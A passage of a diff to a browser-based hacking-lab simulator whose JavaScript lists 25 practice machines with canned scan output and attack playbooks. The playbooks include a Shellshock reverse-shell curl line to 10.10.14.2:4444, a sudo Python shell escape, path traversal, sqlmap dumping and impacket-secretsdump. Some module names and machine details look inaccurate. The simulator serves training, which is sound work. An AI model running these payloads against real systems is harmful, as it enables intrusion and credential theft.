@@ -2,416 +2,307 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Kali Lab v12 | Comprehensive Operating System Sandbox </title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Roboto+Mono:wght@400&display=swap" rel="stylesheet">
+<title>HackerLab PRO // v7.0 25 Machines</title>
 <style>
-  :root {
-    --bg: #0a0f1e; --panel: #111827; --text: #e5e7eb;
-    --muted: #9ca3af; --kali: #0ea5e9; --border: #374151; --term-bg: #000; --code-bg: #0b1220;
-    --success: #22c55e; --danger: #ef4444; --warn: #f59e0b;
-  }
-  * { box-sizing: border-box; }
-  body { margin:0; font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); padding-bottom: 30px; }
-  header { padding:14px 20px; border-bottom:1px solid var(--border); background: rgba(17,24,39,0.9); display: flex; justify-content: space-between; align-items: center; }
-  header h1 { margin:0; font-size:16px; }
-  .badge { font-size:11px; padding:4px 8px; border-radius999px; border:1px solid var(--border); color:var(--muted); }
-  
-  .topology-bar { max-width: 1800px; margin: 16px auto 0; padding: 0 16px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
-  .host-card { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 16px; display: flex; justify-content: space-between; align-items: center; }
-  .host-info h4 { margin: 0 0 4px 0; font-size: 15px; }
-  .host-info p { margin: 0; font-size: 12px; color: var(--muted); font-family: 'Roboto Mono', monospace; }
-  .status-indicator { font-size: 11px; font-weight: bold; padding: 6px 12px; border-radius: 6px; letter-spacing: 0.5px; text-transform: uppercase; border: 1px solid var(--success); color: var(--success); background: rgba(34, 197, 94, 0.1); }
-  .status-compromised { background: rgba(239, 68, 68, 0.1); border: 1px solid var(--danger); color: var(--danger); border-color: var(--danger); animation: pulse 2s infinite; }
-  
-  @keyframes pulse { 0% { opacity: 0.7; } 50% { opacity: 1; } 100% { opacity: 0.7; } }
-
-  .wrap { max-width: 1800px; margin:16px auto; padding:0 16px; display:grid; grid-template-columns: 1fr 580px; gap:16px; }
-  .card { background: var(--panel); border:1px solid var(--border); border-radius:12px; padding:16px; display: flex; flex-direction: column; }
-  .card h3 { margin:0 0 12px; font-size:13px; color:var(--muted); text-transform:uppercase; }
-
-  .terminal { background: var(--term-bg); border:1px solid var(--border); border-radius:10px; height: 680px; display:flex; flex-direction:column; position: relative; }
-  .term-head { padding:8px 12px; background:#0b0b0b; border-bottom:1px solid var(--border); font-size:12px; color:var(--kali); display:flex; gap:6px; }
-  .dot { width:10px; height:10px; border-radius:50%; }
-  .dot.red{background:#ef4444}.dot.yellow{background:#f59e0b}.dot.green{background:#22c55e}
-  .term-body { flex:1; padding:12px; overflow-y:auto; font-family: 'Roboto Mono', monospace; font-size:13px; }
-  .term-line { white-space: pre-wrap; margin-bottom: 4px; line-height: 1.4; }
-  .prompt { color: var(--kali); }
-  .cmd { color: #fff; }
-  .out { color: #a3a3a3; }
-  .err { color: #fca5a5; }
-  .meta-term { color: #38bdf8; }
-  .exploit-success { color: #4ade80; font-weight: bold; }
-  
-  .vim-overlay { display: none; position: absolute; top: 29px; left: 0; right: 0; bottom: 37px; background: #000; color: #00ff00; font-family: 'Roboto Mono', monospace; padding: 12px; flex-direction: column; justify-content: space-between; z-index: 10; }
-  .vim-content { width: 100%; height: 90%; background: transparent; border: none; outline: none; color: #fff; font-family: 'Roboto Mono', monospace; font-size: 14px; resize: none; }
-  .vim-status { border-top: 1px solid #333; padding-top: 4px; font-size: 12px; color: #aaa; display: flex; justify-content: space-between; }
-
-  .term-input { display:flex; border-top:1px solid var(--border); background:#0b0b0b; border-bottom-left-radius: 10px; border-bottom-right-radius: 10px; }
-  .term-input span { padding:10px 12px; color:var(--kali); font-family: 'Roboto Mono', monospace; user-select: none; }
-  .term-input input { flex:1; background:transparent; border:0; outline:none; color:#fff; font-family: 'Roboto Mono', monospace; font-size:13px; padding:10px 4px; }
-
-  .markdown { background: var(--code-bg); border:1px solid var(--border); border-radius:8px; padding:12px; font-family: 'Roboto Mono', monospace; font-size:12px; line-height:1.5; max-height:640px; overflow:auto; white-space: pre-wrap; color:#d1d5db; }
-  .markdown h2 { color:var(--kali); font-size:13px; margin:14px 0 6px; font-family:'Inter'; border-bottom: 1px solid var(--border); padding-bottom: 4px; }
-  .markdown h3 { color:#22c55e; font-size:12px; margin:8px 0 4px; font-family:'Inter'; }
-  .markdown code { background:#1f2937; padding:2px 4px; border-radius:4px; color:#fbbf24; }
+  :root{--bg:#04070d;--panel:#0b1220;--accent:#00ff9d;--accent2:#00c8ff;--text:#cfe9ff;--muted:#64748b;--danger:#ff4d4d;--warn:#ffb86c;--font-mono:'Fira Code','Consolas',monospace}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:radial-gradient(1400px 900px at 15% 5%,#0f172a 0%,var(--bg) 70%);color:var(--text);font-family:var(--font-mono);height:100vh;overflow:hidden;background-image:linear-gradient(rgba(0,255,157,0.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,157,0.025) 1px,transparent 1px);background-size:24px 24px}
+  header{height:44px;background:var(--panel);border-bottom:1px solid rgba(0,255,157,0.18);display:flex;align-items:center;padding:0 14px}
+  header h1{font-size:13px;letter-spacing:2px;color:var(--accent)}
+  header.status{margin-left:auto;font-size:11px;color:var(--muted)}
+.wrap{display:flex;height:calc(100vh - 44px)}
+.sidebar{width:280px;background:rgba(11,18,32,0.85);border-right:1px solid rgba(0,255,157,0.12);overflow-y:auto}
+.playbook{width:360px;background:rgba(11,18,32,0.85);border-left:1px solid rgba(0,255,157,0.12);display:flex;flex-direction:column}
+.main{flex:1;display:flex;flex-direction:column;background:#000}
+.panel-h{font-size:11px;padding:10px 14px;color:var(--accent2);border-bottom:1px solid rgba(0,255,157,0.1);text-transform:uppercase}
+.room{padding:10px 14px;border-bottom:1px solid rgba(0,255,157,0.04);opacity:0.6}
+.room.active{background:rgba(0,200,255,0.12);border-left:3px solid var(--accent);opacity:1}
+.room.name{font-size:12px;color:var(--text)}
+.room.meta{font-size:10px;color:var(--muted);margin-top:3px}
+.tag{padding:2px 6px;border:1px solid;border-radius:4px;font-size:9px;margin-right:4px}
+.tag.easy{color:var(--accent);border-color:var(--accent)}.tag.med{color:var(--warn);border-color:var(--warn)}.tag.hard{color:var(--danger);border-color:var(--danger)}
+.task{padding:8px 12px;border-bottom:1px dashed rgba(0,255,157,0.08);font-size:11px}
+.task.cmd{color:var(--accent2);cursor:pointer;word-break:break-all}
+.task.cmd:hover{background:rgba(0,255,157,0.08)}
+.playbook textarea{flex:1;background:#060a12;color:var(--muted);border:none;outline:none;padding:12px;font-size:11px;resize:none}
+.playbook button{background:var(--panel);color:var(--accent);border-top:1px solid rgba(0,255,157,0.2);padding:8px;font-size:11px;cursor:pointer}
+.term-head{height:30px;background:#0b0b0b;border-bottom:1px solid #1a1a1a;display:flex;align-items:center;padding:0 12px;font-size:11px;color:var(--muted)}
+.term{flex:1;padding:14px;overflow-y:auto;font-size:12px;line-height:1.5;white-space:pre-wrap}
+.prompt{color:var(--accent)}.cmd{color:var(--accent2)}.out{color:var(--text)}.err{color:var(--danger)}.warn{color:var(--warn)}
+.input-line{display:flex}
+.input-line input{flex:1;background:transparent;border:none;outline:none;color:var(--text);font-family:var(--font-mono);font-size:12px}
 </style>
 </head>
 <body>
-
 <header>
-  <h1> Kali Lab v12 <span class="badge">Comprehensive Linux & Threat Simulation Studio | visit  https://github.com/sabirrzc60/CyberRange for Readme.md</span></h1>
-  <div><span class="badge" style="color: var(--kali); border-color: var(--kali);">SUBNET: 10.0.5.0/24</span></div>
+  <h1>[ HACKERLAB PRO v7.0 ]</h1>
+  <div class="status" id="statusBar">SESSION: KALI</div>
 </header>
-
-<div class="topology-bar">
-  <div class="host-card">
-    <div class="host-info">
-      <h4>Linux Target Server (Metasploitable)</h4>
-      <p>IP: 10.0.5.15 | OS: Ubuntu Core | Vectors: FTP, HTTP, SSH</p>
-    </div>
-    <div class="status-indicator" id="status-10.0.5.15">Active / Secure</div>
-  </div>
-  <div class="host-card">
-    <div class="host-info">
-      <h4>Windows Active Directory Node</h4>
-      <p>IP: 10.0.5.20 | OS: Windows Server 2016 | Vectors: SMB</p>
-    </div>
-    <div class="status-indicator" id="status-10.0.5.20">Active / Secure</div>
-  </div>
-</div>
-
 <div class="wrap">
-  <div class="card">
-    <h3>Kali Console [Simulated Workspace - Read Readme.md]</h3>
-    <div class="terminal">
-      <div class="term-head">
-        <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
-        <div id="termUser">root@kali: /</div>
-      </div>
-      
-      <div class="term-body" id="termOut"></div>
-      
-      <div class="vim-overlay" id="vimContainer">
-         <textarea class="vim-content" id="vimEditor" spellcheck="false"></textarea>
-         <div class="vim-status">
-            <span id="vimFilename">[New File]</span>
-            <span>-- INSERT -- Type :wq to exit and save</span>
-         </div>
-      </div>
-
-      <div class="term-input">
-        <span id="termPrompt">root@kali:/~#</span>
-        <input id="termIn" placeholder="Type commands (ls, apt update, ip a, help...)" autocomplete="off" autofocus>
-      </div>
-    </div>
-  </div>
-
-  <div class="card">
-    <h3>COMMANDS.md - Complete Operations Playbook</h3>
-    <div class="markdown" id="mdRef"></div>
-  </div>
+  <aside class="sidebar"><div class="panel-h">Machines // SSH Only [25]</div><div id="roomList"></div></aside>
+  <main class="main">
+    <div class="term-head" id="termHead">root@kali: ~</div>
+    <div class="term" id="terminal"></div>
+    <div class="input-line"><span class="prompt" id="prompt">kali@htb:~$ </span><input id="cmdInput" autocomplete="off" placeholder="help, msfconsole, ssh user@ip"></div>
+  </main>
+  <aside class="playbook"><div class="panel-h" id="playbookTitle">Playbook: KALI</div><div id="taskList" style="overflow-y:auto;flex:1"></div><textarea id="notes" placeholder="Your notes here..."></textarea><button onclick="saveNotes()">Save Notes</button></aside>
 </div>
-
 <script>
-const COMMANDS_MD = `# Kali Lab v12 - Complete OS Playbook
+const kaliCmds = [
+  `nmap <ip> : Scan target ports/services`,
+  `ssh <user>@<ip> : SSH into a room`,
+  `msfconsole : Launch Metasploit Framework`,
+  `ls : List files: rooms.txt exploits wordlists`,
+  `cd <dir> : Change dir`,
+  `mkdir <dir> : Make directory`,
+  `rm <file> : Remove file`,
+  `cat rooms.txt : Show all targets + ssh strings`,
+  `ping <ip> : Ping host`,
+  `enum : List all machines`,
+  `ipconfig : Show Kali IP: 10.10.14.2`,
+  `whoami : Print kali`,
+  `clear : Clear terminal`,
+  `help : Show this menu`,
+  `exit : Only works in-room`
+];
 
-## 1. System Maintenance & Diagnostics
-* \`apt update\` or \`apt install tor\` (Simulate package arrays)
-* \`systemctl start apache2\` (Manage system processes)
-* \`top\` or \`htop\` (Analyze resource task limits)
-* \`uname -a\` (Print system core environment information)
+const msfCmds = [
+  `search apache : Find exploit modules`,
+  `use exploit/... : Set exploit`,
+  `set RHOSTS <ip> : Set target IP`,
+  `set RPORT 80 : Set port`,
+  `run : Execute exploit`,
+  `sessions -l : List active shells`,
+  `sessions -i 1 : Interact with shell 1`,
+  `back : Go back from module/session`,
+  `exit : Exit Metasploit to Kali`
+];
 
-## 2. Text Stream Formatting 
-* \`head -n 2 COMMANDS.md\` / \`tail -n 2 network_topology.conf\`
-* \`sed s/10.0.5.15/TARGET/ COMMANDS.md\` (Dynamic inline transformations)
-* \`awk {print} vulnerability_matrix.json\` (Data segment parsing)
+const msfPostCmds = [
+  `whoami : Current user`,
+  `sysinfo : System info`,
+  `shell : Drop to system shell`,
+  `upload <lfile> <rfile> : Upload file to target`,
+  `download <rfile> <lfile> : Download file from target`,
+  `execute -f <file> : Execute file on target`,
+  `background : Background session`,
+  `exit : Exit session to msf6`
+];
 
-## 3. Advanced Networking
-* \`ip a\` or \`ip route\` (Inspecting local routing parameters)
-* \`ss -tlnp\` (Inspect listening system network sockets)
-* \`curl http://10.0.5.15:8080\` / \`wget http://10.0.5.15/index.html\`
+const msfModules = [
+  `exploit/multi/http/apache_mod_cgi_bash_env_exec Apache Mod CGI Bash Environment Variable Code Injection`,
+  `exploit/windows/smb/ms17_010_eternalblue MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption`,
+  `auxiliary/scanner/ssh/ssh_login SSH Login Check Scanner`
+];
 
-## 4. Integrity Permissions Rings
-* \`chmod +x exploit.sh\` (Toggle execution permissions)
-* \`chown root:root network_topology.conf\` (Modify file ownership structural variables)
-* \`sudo -l\` (Enumerate administrative capability profiles)
-`;
+// 4 EASY + 10 MEDIUM + 11 HARD = 25 TOTAL
+const rooms = [
+  // EASY [4]
+  {id:1,name:"Vulnversity",ip:"10.10.10.11",diff:"easy",os:"Linux",user:"www-data",nmap:`PORT STATE SERVICE VERSION\n80/tcp open http Apache httpd 2.4.29\nOS: Linux 4.15`,playbook:[`nmap 10.10.10.11`,`gobuster dir -u http://10.10.10.11 -w common.txt`,`sqlmap -u "http://10.10.10.11/list.php?id=1" --dump`,`sudo -l`,`cat user.txt`,`cat root.txt`]},
+  {id:2,name:"Basic Pentesting",ip:"10.10.10.12",diff:"easy",os:"Linux",user:"janitor",nmap:`PORT STATE SERVICE VERSION\n21/tcp open ftp vsftpd 3.0.3\n22/tcp open ssh OpenSSH 7.6`,playbook:[`ftp 10.10.10.12`,`cat note.txt`,`sudo python3 -c "import os; os.system('/bin/bash')"`,`cat user.txt`,`cat root.txt`]},
+  {id:8,name:"HackerSploit",ip:"10.10.10.18",diff:"easy",os:"Linux",user:"kenny",nmap:`PORT STATE SERVICE\n22/tcp open ssh`,playbook:[`cat.ssh/id_rsa`,`sudo -l`,`cat user.txt`,`cat root.txt`]},
+  {id:9,name:"Lame",ip:"10.10.10.19",diff:"easy",os:"Linux",user:"ftp",nmap:`PORT STATE SERVICE VERSION\n21/tcp open ftp vsftpd 2.3.4\n139/tcp open netbios-ssn Samba smbd 3.X`,playbook:[`nmap --script vuln 10.10.10.19`,`use exploit/unix/ftp/vsftpd_234_backdoor`,`set RHOSTS 10.10.10.19`,`run`,`cat user.txt`,`cat root.txt`]},
 
-/* ========== DISK STORAGE MATRIX CONTROLLERS ========== */
-let CURRENT_DIR = "/root";
-let ARCHIVE_FILES = {
-  "/root/COMMANDS.md": COMMANDS_MD,
-  "/root/network_topology.conf": "SUBNET CONFIG RANGE=10.0.5.0/24\nLOCAL_INTERFACE_IP=10.0.5.5",
-  "/root/vulnerability_matrix.json": "{\n  \"targets\": [\"10.0.5.15\", \"10.0.5.20\"]\n}",
-  "/root/exploit.sh": "#!/bin/bash\necho \"Executing local check sequence...\""
-};
-let ARCHIVE_FOLDERS = ["/root", "/root/logs"];
+  // MEDIUM [10]
+  {id:3,name:"Jerry",ip:"10.10.10.13",diff:"med",os:"Windows",user:"tomcat",nmap:`PORT STATE SERVICE VERSION\n8080/tcp open http Apache Tomcat 8.5.5`,playbook:[`nmap -sV 10.10.10.13`,`msfconsole`,`use exploit/multi/http/tomcat_mgr_upload`,`set RHOSTS 10.10.10.13`,`run`,`cat user.txt`,`cat root.txt`]},
+  {id:4,name:"Optimum",ip:"10.10.10.14",diff:"med",os:"Windows",user:"kostas",nmap:`PORT STATE SERVICE VERSION\n80/tcp open http HttpFileServer 2.3`,playbook:[`nmap 10.10.10.14`,`search HttpFileServer`,`use exploit/windows/http/rejetto_hfs_exec`,`set RHOSTS 10.10.10.14`,`run`,`cat user.txt`,`cat root.txt`]},
+  {id:5,name:"Blue",ip:"10.10.10.15",diff:"med",os:"Windows",user:"Administrator",nmap:`PORT STATE SERVICE VERSION\n445/tcp open smb Microsoft SMBv1`,playbook:[`nmap --script smb-vuln-ms17-010 10.10.10.15`,`msfconsole`,`use exploit/windows/smb/ms17_010_eternalblue`,`set RHOSTS 10.10.10.15`,`run`,`cat user.txt`,`cat root.txt`]},
+  {id:6,name:"SneakyMailer",ip:"10.10.10.16",diff:"med",os:"Linux",user:"low",nmap:`PORT STATE SERVICE VERSION\n25/tcp open smtp Postfix\n80/tcp open http Apache`,playbook:[`nmap 10.10.10.16`,`smtp-user-enum -M VRFY -U users.txt -t 10.10.10.16`,`ssh low@10.10.10.16`,`sudo -l`,`cat user.txt`,`cat root.txt`]},
+  {id:7,name:"Affection",ip:"10.10.10.17",diff:"med",os:"Linux",user:"bob",nmap:`PORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH\n80/tcp open http Apache`,playbook:[`nmap 10.10.10.17`,`gobuster dir -u http://10.10.10.17 -w rockyou.txt`,`ssh bob@10.10.10.17`,`sudo /usr/bin/vim`,`cat user.txt`,`cat root.txt`]},
+  {id:10,name:"Forest",ip:"10.10.10.20",diff:"med",os:"Windows",user:"svc-alfresco",nmap:`PORT STATE SERVICE VERSION\n389/tcp open ldap\n445/tcp open smb`,playbook:[`nmap 10.10.10.20`,`ldapsearch -x -H ldap://10.10.10.20`,`ssh svc-alfresco@10.10.10.20`,`cat user.txt`,`cat root.txt`]},
+  {id:11,name:"OpenAdmin",ip:"10.10.10.21",diff:"med",os:"Linux",user:"james",nmap:`PORT STATE SERVICE VERSION\n80/tcp open http Apache\n22/tcp open ssh`,playbook:[`nmap 10.10.10.21`,`gobuster dir -u http://10.10.10.21 -w common.txt`,`ssh james@10.10.10.21`,`sudo -l`,`cat user.txt`,`cat root.txt`]},
+  {id:12,name:"Archetype",ip:"10.10.10.22",diff:"med",os:"Windows",user:"sql_svc",nmap:`PORT STATE SERVICE VERSION\n1433/tcp open mssql`,playbook:[`nmap -sV 10.10.10.22`,`msfconsole`,`use auxiliary/admin/mssql/mssql_sql`,`set RHOSTS 10.10.10.22`,`run`,`cat user.txt`,`cat root.txt`]},
+  {id:13,name:"Precious",ip:"10.10.10.23",diff:"med",os:"Linux",user:"henry",nmap:`PORT STATE SERVICE VERSION\n80/tcp open http Node.js Express`,playbook:[`nmap 10.10.10.23`,`curl http://10.10.10.23/?page=../../../etc/passwd`,`ssh henry@10.10.10.23`,`cat user.txt`,`cat root.txt`]},
+  {id:14,name:"Shocker",ip:"10.10.10.24",diff:"med",os:"Linux",user:"shelly",nmap:`PORT STATE SERVICE VERSION\n80/tcp open http Apache 2.4.18`,playbook:[`nmap 10.10.10.24`,`curl -H "User-Agent: () { :;}; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'" http://10.10.10.24/cgi-bin/user.sh`,`cat user.txt`,`cat root.txt`]},
 
-let MSF_MODE = false;
-let VIM_MODE = false;
-let VIM_TARGET_FILE = "";
-let CHOSEN_EXPLOIT = '';
-let CHOSEN_RHOST = '';
+  // HARD [11]
+  {id:15,name:"Active",ip:"10.10.10.25",diff:"hard",os:"Windows",user:"bob",nmap:`PORT STATE SERVICE VERSION\n53/tcp open dns\n88/tcp open kerberos`,playbook:[`nmap 10.10.10.25`,`impacket-GetNPUsers -no-pass active.htb/`,`ssh bob@10.10.10.25`,`cat user.txt`,`cat root.txt`]},
+  {id:16,name:"SwagShop",ip:"10.10.10.26",diff:"hard",os:"Linux",user:"karen",nmap:`PORT STATE SERVICE VERSION\n80/tcp open http Magento`,playbook:[`nmap 10.10.10.26`,`msfconsole`,`use exploit/multi/http/magento_unserialize`,`set RHOSTS 10.10.10.26`,`run`,`cat user.txt`,`cat root.txt`]},
+  {id:17,name:"Networked",ip:"10.10.10.27",diff:"hard",os:"Linux",user:"guly",nmap:`PORT STATE SERVICE VERSION\n80/tcp open http Apache`,playbook:[`nmap 10.10.10.27`,`nc 10.10.10.27 9999`,`ssh guly@10.10.10.27`,`sudo -l`,`cat user.txt`,`cat root.txt`]},
+  {id:18,name:"Silo",ip:"10.10.10.28",diff:"hard",os:"Linux",user:"dave",nmap:`PORT STATE SERVICE VERSION\n22/tcp open ssh\n8080/tcp open http`,playbook:[`nmap 10.10.10.28`,`gobuster dir -u http://10.10.10.28:8080 -w common.txt`,`ssh dave@10.10.10.28`,`sudo /usr/bin/python3`,`cat user.txt`,`cat root.txt`]},
+  {id:19,name:"Nest",ip:"10.10.10.29",diff:"hard",os:"Windows",user:"administrator",nmap:`PORT STATE SERVICE VERSION\n445/tcp open smb\n3389/tcp open rdp`,playbook:[`nmap 10.10.10.29`,`msfconsole`,`use exploit/windows/smb/smb_relay`,`set RHOSTS 10.10.10.29`,`run`,`cat user.txt`,`cat root.txt`]},
+  {id:20,name:"Remote",ip:"10.10.10.30",diff:"hard",os:"Linux",user:"jimmy",nmap:`PORT STATE SERVICE VERSION\n22/tcp open ssh\n80/tcp open http`,playbook:[`nmap 10.10.10.30`,`gobuster dir -u http://10.10.10.30 -w common.txt`,`ssh jimmy@10.10.10.30`,`sudo -l`,`cat user.txt`,`cat root.txt`]},
+  {id:21,name:"Bastard",ip:"10.10.10.31",diff:"hard",os:"Windows",user:"vlad",nmap:`PORT STATE SERVICE VERSION\n80/tcp open http IIS`,playbook:[`nmap 10.10.10.31`,`msfconsole`,`use exploit/windows/iis/iis_webdav_upload_asp`,`set RHOSTS 10.10.10.31`,`run`,`cat user.txt`,`cat root.txt`]},
+  {id:22,name:"Monteverde",ip:"10.10.10.32",diff:"hard",os:"Windows",user:"carlos",nmap:`PORT STATE SERVICE VERSION\n53/tcp open dns\n88/tcp open kerberos`,playbook:[`nmap 10.10.10.32`,`impacket-secretsdump monteverde.htb/carlos@10.10.10.32`,`cat user.txt`,`cat root.txt`]},
+  {id:23,name:"Buff",ip:"10.10.10.33",diff:"hard",os:"Windows",user:"oswald",nmap:`PORT STATE SERVICE VERSION\n8080/tcp open http`,playbook:[`nmap 10.10.10.33`,`msfconsole`,`use exploit/windows/misc/hgfsdi_bof`,`set RHOSTS 10.10.10.33`,`run`,`cat user.txt`,`cat root.txt`]},
+  {id:24,name:"Tabby",ip:"10.10.10.34",diff:"hard",os:"Linux",user:"ash",nmap:`PORT STATE SERVICE VERSION\n8080/tcp open http Tomcat`,playbook:[`nmap 10.10.10.34`,`msfconsole`,`use exploit/multi/http/tomcat_jsp_upload_bypass`,`set RHOSTS 10.10.10.34`,`run`,`cat user.txt`,`cat root.txt`]},
+  {id:25,name:"Postman",ip:"10.10.10.35",diff:"hard",os:"Linux",user:"matt",nmap:`PORT STATE SERVICE\n6379/tcp open redis`,playbook:[`redis-cli -h 10.10.10.35`,`ssh -i id_rsa matt@10.10.10.35`,`sudo -l`,`cat user.txt`,`cat root.txt`]}
+];
 
-const PLAYBOOKS_REGISTRY = {
-  "exploit/unix/ftp/vsftpd_234_backdoor": { "target_ip": "10.0.5.15", "success_payload_response": "[*] Targeting 10.0.5.15:21...\n[+] Shell session 1 opened. Linux Host Compromised." },
-  "exploit/windows/smb/ms17_010_eternalblue": { "target_ip": "10.0.5.20", "success_payload_response": "[*] Targeting 10.0.5.20:445...\n[+] Meterpreter session 2 opened. Windows Host Compromised." },
-  "exploit/multi/http/struts2_content_type_ognl": { "target_ip": "10.0.5.15", "success_payload_response": "[*] Sending header Expression...\n[+] Shell session 3 opened successfully! Web server context compromised." },
-  "auxiliary/scanner/ssh/ssh_login": { "target_ip": "10.0.5.15", "success_payload_response": "[*] Running scan loop check...\n[+] Success! Credentials verified: admin / p@ssword123\n[*] Shell session 4 opened." }
-};
+let session={mode:'kali',room:null, cwd:'~', vfs:['rooms.txt','exploits','wordlists'], msf:false, msfModule:null, msfRhosts:null, msfSession:false, msfSessionId:1, meterFs:['root.txt','user.txt','/etc/passwd']};
+const term=document.getElementById('terminal');
+const input=document.getElementById('cmdInput');
+const promptEl=document.getElementById('prompt');
+const termHead=document.getElementById('termHead');
+const statusBar=document.getElementById('statusBar');
+const playbookTitle=document.getElementById('playbookTitle');
 
-const termOut = document.getElementById('termOut');
-const termIn = document.getElementById('termIn');
-const termUser = document.getElementById('termUser');
-const termPrompt = document.getElementById('termPrompt');
-const vimContainer = document.getElementById('vimContainer');
-const vimEditor = document.getElementById('vimEditor');
-const vimFilename = document.getElementById('vimFilename');
-document.getElementById('mdRef').textContent = COMMANDS_MD;
+function log(l,c='out'){term.innerHTML+=`<div class="${c}">${l}</div>`;term.scrollTop=term.scrollHeight}
+function pcmd(l){log(`<span class="prompt">${promptEl.textContent}</span> <span class="cmd">${l}</span>`)}
 
-function refreshPrompt(){
-  if (MSF_MODE) {
-    termUser.textContent = `msf6`;
-    let exploitSlug = CHOSEN_EXPLOIT ? ` (${CHOSEN_EXPLOIT.split('/').pop()})` : '';
-    termPrompt.innerHTML = `<span style="color:#ef4444">msf6</span> exploit${exploitSlug} &gt;`;
-  } else {
-    termUser.textContent = `root@kali: ${CURRENT_DIR}`;
-    termPrompt.textContent = `root@kali:${CURRENT_DIR}#`;
+function updatePrompt(){
+  if(session.msfSession){promptEl.textContent='meterpreter > ';termHead.textContent='meterpreter 1';return}
+  if(session.msf){promptEl.textContent='msf6 > ';termHead.textContent='msf6';return}
+  promptEl.textContent = session.mode==='kali'? `kali@htb:${session.cwd}$ ` : `${session.room.user}@${session.room.name.toLowerCase().replace(' ','')}:~$ `;
+  termHead.textContent = session.mode==='kali'? `root@kali: ${session.cwd}` : `${session.room.user}@${session.room.name.toLowerCase().replace(' ','')}: ~/`;
+}
+
+function setPlaybook(type,room=null){
+  if(type==='kali'){playbookTitle.textContent='Playbook: KALI';renderKaliPlaybook()}
+  if(type==='msf'){playbookTitle.textContent='Playbook: METASPLOIT';renderMsfPlaybook()}
+  if(type==='msfpost'){playbookTitle.textContent='Playbook: POST-EXPLOIT';renderMsfPostPlaybook()}
+  if(type==='room'){playbookTitle.textContent=`Playbook: ${room.name}`;renderRoomPlaybook(room)}
+}
+
+function setSession(mode,room=null){
+  session={...session, mode, room, cwd:'~', msf:false, msfModule:null, msfRhosts:null, msfSession:false};
+  if(mode==='kali'){
+    statusBar.textContent='SESSION: KALI';
+    log('[+] Returned to Kali','warn');
+    setPlaybook('kali');
+    document.getElementById('notes').value=localStorage.getItem(`notes_kali`)||'';
+  }else{
+    statusBar.textContent=`SESSION: ${room.name} | ${room.ip}`;
+    log(`Linux ${room.name} 5.4.0-42-generic x86_64\nLast login: Mon Apr 8 12:34:56 2026 from 10.10.14.2`,'out');
+    setPlaybook('room',room);
+    document.getElementById('notes').value=localStorage.getItem(`notes_${room.id}`)||'';
   }
+  updatePrompt();
+  renderRooms();
 }
 
-function termPrint(html, cls='out'){
-  const div = document.createElement('div');
-  div.className = `term-line ${cls}`; div.innerHTML = html;
-  termOut.appendChild(div); termOut.scrollTop = termOut.scrollHeight;
+function renderRooms(){document.getElementById('roomList').innerHTML=rooms.map(r=>`<div class="room ${session.room?.id===r.id?'active':''}"><div class="name">${r.name}</div><div class="meta"><span class="tag ${r.diff}">${r.diff.toUpperCase()}</span> ${r.ip} | ${r.user}@${r.ip}</div></div>`).join('')}
+function renderKaliPlaybook(){document.getElementById('taskList').innerHTML=kaliCmds.map(c=>`<div class="task"><div class="task cmd" onclick="input.value=\`${c.split(':')[0].trim()}\`;input.focus()">${c}</div></div>`).join('')}
+function renderMsfPlaybook(){document.getElementById('taskList').innerHTML=msfCmds.map(c=>`<div class="task"><div class="task cmd" onclick="input.value=\`${c.split(':')[0].trim()}\`;input.focus()">${c}</div></div>`).join('')}
+function renderMsfPostPlaybook(){document.getElementById('taskList').innerHTML=msfPostCmds.map(c=>`<div class="task"><div class="task cmd" onclick="input.value=\`${c.split(':')[0].trim()}\`;input.focus()">${c}</div></div>`).join('')}
+function renderRoomPlaybook(room){document.getElementById('taskList').innerHTML=room.playbook.map(c=>`<div class="task"><div class="task cmd" onclick="input.value=\`${c}\`;input.focus()">${c}</div></div>`).join('')}
+
+function sim(cmd, room){
+  if(cmd.startsWith('nmap')) return room.nmap;
+  if(cmd.startsWith('gobuster')) return `===============================================================\n/.admin${room.id} (Status: 200) [Size: 1024]\n/.internal${room.id} (Status: 301) [Size: 178]\n===============================================================`;
+  if(cmd.startsWith('sqlmap')) return `[+] 'id' is MySQL injectable\n| username | password |\n| admin | THM{sql_dump} |`;
+  if(cmd==='sudo -l') return `User ${room.user} may run the following commands:\n (ALL : ALL) ALL`;
+  if(cmd==='ftp 10.10.10.12') return `220 vsFTPD\n230 Login successful.\nftp> get note.txt\n226 Transfer complete.`;
+  if(cmd.startsWith('redis-cli')) return `127.0.0.1:6379> OK\n127.0.0.1:6379> OK`;
+  if(cmd.startsWith('cat user.txt')) return `THM{${room.name.replace(' ','_')}_USER_FLAG_8f2k}`;
+  if(cmd.startsWith('cat root.txt')) return `THM{${room.name.replace(' ','_')}_ROOT_FLAG_9m1q}`;
+  if(cmd==='whoami') return room.user;
+  if(cmd==='ls') return `user.txt root.txt notes.txt`;
+  return `[+] Command output for: ${cmd}`;
 }
 
-function updateTopologyUI(hostIp) {
-  const el = document.getElementById(`status-${hostIp}`);
-  if (el) { el.className = 'status-indicator status-compromised'; el.textContent = 'COMPROMISED / ROOT ACCESS'; }
-}
-
-function runCmd(input){
-  const parts = input.split(' ').filter(Boolean);
-  if (parts.length === 0) return '';
+function runKali(cmd){
+  const parts = cmd.trim().split(' ');
   const base = parts[0];
   const args = parts.slice(1);
 
-  if (MSF_MODE) {
-    if (base === 'exit' || base === 'quit') { MSF_MODE = false; CHOSEN_EXPLOIT = ''; CHOSEN_RHOST = ''; refreshPrompt(); return 'Exiting Metasploit Framework...'; }
-    if (base === 'use') {
-      if (PLAYBOOKS_REGISTRY.hasOwnProperty(args[0])) { CHOSEN_EXPLOIT = args[0]; refreshPrompt(); return `Matching module found. Configuring exploit parameters.`; }
-      return `[!] Unknown module configuration mapping path or unlinked threat asset.`;
+  if(session.msfSession){
+    if(base==='exit'){session.msfSession=false;log('[*] Backgrounded session 1','warn');setPlaybook('msf');updatePrompt();return}
+    if(base==='whoami'){log('www-data','out');return}
